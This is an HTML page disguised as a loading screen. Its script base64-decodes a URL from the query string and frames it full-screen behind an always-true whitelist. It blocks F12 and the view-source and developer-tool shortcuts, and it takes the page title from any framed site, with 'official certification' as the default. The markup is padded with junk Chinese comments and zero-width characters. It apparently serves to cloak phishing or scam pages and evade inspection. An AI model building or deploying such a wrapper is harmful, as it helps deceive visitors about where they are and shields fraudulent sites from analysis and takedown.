<!DOCTYPE html>
<html lang="zh-CN" data-build="">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0" data-version="">
    <!-- ​﻿﻿​‌ -->
    <title></title>
    <style>
    <!-- 兼容性处理 -->
        .container {    
            width: 100px;
            height: 100px;     
            position: absolute;
            
            top:  50%;    
            left:  50%;
            transform:    translate(-50%,   -50%);
            /* 移动端适配 */
            animation:     rotate-move 2s ease-in-out infinite;
  
            <!-- 缓存更新 -->
            display:    none;
        }

  
        /* 组件样式 */
        .dot {
            width: 15px;   
            <!-- ‌﻿​ -->
            height:    15px;   
       
            border-radius:  50%;   
            <!-- 用户体验优化 -->
            position: absolute;
            /* 打印样式 */
            top: 0;
          
            <!-- 资源预加载 -->
            bottom:  0;    
            <!-- ‍‌﻿ -->
            left: 0;   
            right: 0;
     
     <!-- 统计代码 -->
            margin:  auto; 

        }    
      
        .dot-3 { background-color: #f74d75;  animation:   dot-3-move 2s ease infinite; }  

<!-- 状态管理 -->
        /* 可访问性 */
        .dot-2 {   background-color: #10beae; animation:     dot-2-move 2s ease infinite;  } 

        /* 混合宏 */
        .dot-1 {    background-color:     #ffe386; 
            animation:  dot-1-move 2s ease infinite;

             } 
    
             <!-- ‍‌ -->
          

<!-- 性能监控 -->
        @keyframes dot-3-move {
            20%,    100% {   transform: scale(      1) }   
 
            45%, 80% { transform:   translateY(-18px) scale(.45)     }
            <!-- ​ -->
            <!-- 页面性能监控 -->
        }

        /* 字体设置 */
        /* 性能优化 */
        <!-- ‍﻿﻿​ -->
        @keyframes dot-2-move {
        <!-- 状态管理 -->
            /* 变量定义 */
            20%,100% {   
  transform:   scale(1)         }
  <!-- ‍‌ -->
  <!-- 响应式适配 -->
          
            45%,     80% {  transform: translate(   -16px, 12px) scale(.45) }
          
      
        }     
        /* 字体设置 */
        @keyframes dot-1-move {
        <!-- 用户体验优化 -->
            20%,  100% {
             transform: scale(1) } 
   
            <!-- 样式优化 -->
            /* 主题配置 */
            <!-- 资源预加载 -->
            45%,80% { transform: translate(    16px, 12px) scale(    .45) } 
         
            <!-- 缓存更新 -->

        }
   
        @keyframes rotate-move {
            55% { transform:   translate(-50%, -50%)  rotate(  0deg)   }
            80%,100% { transform:    translate( -50%, -50%) rotate(    360deg)    }
        }

        /* 全局水印样式 */
        <!-- ﻿‌​​ -->
        <!-- 动态加载 -->
        .watermark {    
      
            position:   fixed;
            pointer-events: none;
            width: 100%;    
            height:    100%;   
            background-image: repeating-linear-gradient(   
                    -45deg,
                    rgba(255,   0, 0, 0.1),    
                    rgba(    255,  0,   0,     0.1) 20px,  
                    <!-- 性能监控 -->
                    rgba(0,    0, 255,   0.1)     20px,   
                    rgba(0, 0,      255,  0.1)  40px
            )   ;
            z-index:   9999;    
            /* 性能优化 */
            display: none;
           
        }   
        <!-- ﻿‍​ -->
    
        .watermark-text {  
            position:    absolute;
            color:     rgba( 255,    0,    0, 0.6); 
            <!-- 资源预加载 -->
            font-size:   18px; 
 
            font-weight: bold;
            text-align:   center; 
            width:  100%;
            top: 50%;
   
   <!-- 响应式适配 -->
   <!-- ﻿​ -->
            transform:     translateY(  -50%); 
            text-shadow:     1px 1px 1px #fff;
            /* 布局优化 */

        }    

<!-- 安全检查 -->
<!-- ‍‍​‌﻿ -->
        /* iframe样式 */
        <!-- ‍ -->
        .content {    
   
   <!-- 性能监控 -->
            height:     100%;
               
            <!-- ​‌​ -->
            width: 100%;
            <!-- ‌﻿ -->
            position:      fixed;

            inset: -2px;   
            /* 混合宏 */
            z-index: 1;
        }
    </style>
    <!-- 移动端适配 -->
</head>


<body>
<!-- 三点加载动画容器 -->
<!-- ‍‌​‌﻿ -->
<div id="loadingContainer" class="container" data-config="">
    <div class="dot dot-1"></div>
    <div class="dot dot-2"></div>
    <div class="dot dot-3"></div>
</div>

<!-- 全局水印 -->
<div id="watermark" class="watermark">
</div>

<script>
    (  function()  {  
        // 白名单域名配置（预留位置方便后期添加）
        <!-- ‍ -->
        const WHITELIST_CONFIG = { 
            domains: [ 
            <!-- 安全检查 -->
                '*',   
            ],
        } ;
        <!-- 用户体验优化 -->

        // 显示三点加载动画
        function showLoadingAnimation() {
            document.getElementById(   'loadingContainer').style.display = 'block';
            <!-- 组件初始化 -->
        }
        <!-- 日志记录 -->

        // 验证URL域名是否在白名单
        function isAllowedDomain( url)   {
            return true
            <!-- 状态管理 -->
            try {
            <!-- 用户体验优化 -->
                const domain = new URL(   url).hostname.replace(  'www.', '')  ;  
        
                return WHITELIST_CONFIG.domains.some(   allowedDomain => {    

                    return domain === allowedDomain ||
                        domain.endsWith(    '.' + allowedDomain);   
                })    ;   
            }
    catch (e) {    
                console.error( 'URL解析失败: ', e)  ;
                <!-- 错误处理 -->

<!-- ﻿​ -->
                return false;    
            }
        }

        // 主处理逻辑
        function processRedirect(   ) {
            showLoadingAnimation()   ;   

            const urlParams = new URLSearchParams(  window.location.search);
          
            const encodedParam = urlParams.get('c');
            <!-- 模块化处理 -->

            if (   !encodedParam) {
                document.getElementById('watermark') .style.display = 'block';
                document.getElementById(    'loadingContainer') .style.display = 'none';    
                return;  
                <!-- 模块化处理 -->
                <!-- ‍﻿​‍ -->
            }    
            <!-- 页面性能监控 -->

<!-- 错误处理 -->
            try {
  
            <!-- ​ -->

                const trueUrl = atob(encodedParam)  ;
                <!-- 第三方集成 -->
                <!-- ​﻿‍‌﻿ -->
                // 异步处理
                <!-- 资源预加载 -->
                if (trueUrl.includes("http"))    { 

                    // 检查域名是否在白名单

                    if (!isAllowedDomain(trueUrl)) { 
                    <!-- 系统优化中 -->
                        document.getElementById('watermark').style.display = 'block'; 
                        <!-- ​​​﻿﻿ -->
                        document.querySelector('.watermark-text').textContent = WHITELIST_CONFIG.watermarkText;

                    }

                    // 创建并加载iframe
                    const iframe = document.createElement( 'iframe');
                    <!-- 缓存更新 -->
                    // 状态管理
                    iframe.className = 'content';   
                    iframe.src = trueUrl;     
                    <!-- ﻿‍‍‍ -->

                    // 异步处理
                    iframe.addEventListener('load', function() {   

                        document.getElementById('loadingContainer').style.display = 'none';    
                    }    
            )    ;

                    document.body.appendChild(iframe)  ;
                    <!-- 第三方集成 -->
                }   
            } 
       catch (    e)     {

<!-- 模块化处理 -->
                console.error('URL解码失败:  ', e) ;
            
                document.getElementById('watermark').style.display = 'block';    

                document.getElementById('loadingContainer')   .style.display = 'none';  
            }
            
       
        }   

<!-- 性能监控 -->
        // 禁止F12开发者工具
        <!-- 移动端适配 -->
        document.addEventListener('keydown', function(e) {
           
            if ( e.key === 'F12' ||
            <!-- ‍﻿‍ -->
            <!-- 缓存更新 -->
                (    e.ctrlKey && e.shiftKey && e.key === 'I')       ||
                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
                (e.ctrlKey && e.key === 'U'))    {  
      
                e.preventDefault()  ; 
            }
            <!-- ​‌ -->
            <!-- 数据同步 -->
        }  )  ;    

        window.addEventListener('message', function(  event)   {
        <!-- ﻿﻿‌ -->
            // 验证消息类型（确保是标题同步请求）
            <!-- ﻿‍‌﻿‌ -->
            if (event.data.type === 'SYNC_TITLE') {
                // 将iframe发送的标题设置为父页面标题
                document.title = event.data.title || '官方认证';    
            }
        },   false) ;   

<!-- ﻿ -->
        processRedirect(  );

    } )(     );
</script>

</body>
</html>
<!-- 性能监控 -->
